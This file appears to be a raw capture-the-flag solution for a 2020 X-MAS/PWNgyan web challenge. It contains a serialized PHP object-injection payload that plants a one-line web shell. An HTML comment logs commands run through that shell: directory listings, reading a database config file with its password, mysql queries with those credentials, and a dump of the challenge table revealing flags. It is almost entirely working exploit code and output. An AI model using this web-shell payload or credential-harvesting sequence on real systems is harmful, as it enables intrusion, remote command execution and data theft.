<?php
    'O:11:"pageContent":2:{s:22:"�pageContent�file_name";s:15:"data/pyburp.php";s:23:"�pageContent�newContent";s:15:"<?=`$_GET[x]`?>";}'
?>

<!--
http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=ls ~/
output => ctfx

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=ls ~/ctfx
output => composer.json composer.lock htdocs include install writable

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=ls ~/ctfx/include
output => Config.php cache.inc.php captcha.inc.php config config_loader.inc.php constants.inc.php db.inc.php email.inc.php files.inc.php general.inc.php json.inc.php language layout mellivora.inc.php raceconditions.inc.php session.inc.php thirdparty two_factor_auth.inc.php xsrf.inc.php

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=ls ~/ctfx/include/config
=> config.default.inc.php db.default.inc.php

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=cat ~/ctfx/include/config/db.default.inc.php
output => 


/**
 *
 * This file contains default configuration.
 *
 *        DO NOT MAKE CHANGES HERE
 *
 * Copy this file and name it "db.inc.php"
 * before making any changes. Any changes in
 * db.inc.php will override the default
 * config. It is also possible to override
 * configuration options using environment
 * variables. Environment variables override
 * both the default settings and the hard-coded
 * user defined settings.
 *
 */

Config::set('MELLIVORA_CONFIG_DB_ENGINE', 'mysql');
Config::set('MELLIVORA_CONFIG_DB_HOST', 'localhost');
Config::set('MELLIVORA_CONFIG_DB_PORT', 3306);
Config::set('MELLIVORA_CONFIG_DB_NAME', 'mellivora');
Config::set('MELLIVORA_CONFIG_DB_USER', 'mellivora');
Config::set('MELLIVORA_CONFIG_DB_PASSWORD', 'rac9138cn98ascnascud');


http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e "show tables;"
output => Tables_in_mellivora categories challenges cookie_tokens countries exceptions files hints ip_log news reset_password submissions two_factor_auth user_types users

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e "select * from challenges"
output => 
id	added	added_by	title	category	description	exposed	available_from	available_until	flag	case_insensitive	automark	points	initial_points	minimum_points	solve_decay	solves	num_attempts_allowed	min_seconds_between_submissions	relies_on
1	1606078385	1	Brutus	1	Everyone hates Brutus! But does Brutus hate everyone? Who knows? Or rather, who cares?! What we care about here is the flag. Nothing more.
\n
\nLink: [url]http://challs.xmas.htsp.ro:3050[/url]	1	1584699200	1617235206	pwngyanctf{we_dont_remember_the_actual_flag_:(}	0	1	500	500	50	100	2	0	5	0
2	1606081056	1	Hard Challenge	1	Now it's time for a ramp-up in difficulty. You thought Brutus was hard? Ha! Check this one out then, punk.
\n
\nLink: [url]http://challs.xmas.htsp.ro:3051[/url]	1	1584699200	1617235206	X-MAS{Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0}	0	1	500	500	50	100	0	0	5	0
3	1606081136	1	Hello World!	2	Welcome to PWNgyan CTF 2020!
\n
\n[b]pwngyanctf{H3ll0_H4ckerz_3141cc5f}[/b]	1	1584699200	1617235206	pwngyanctf{H3ll0_H4ckerz_3141cc5f}	0	1	10	10	10	1	3	0	5	0


Output : X-MAS{Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0}
-->

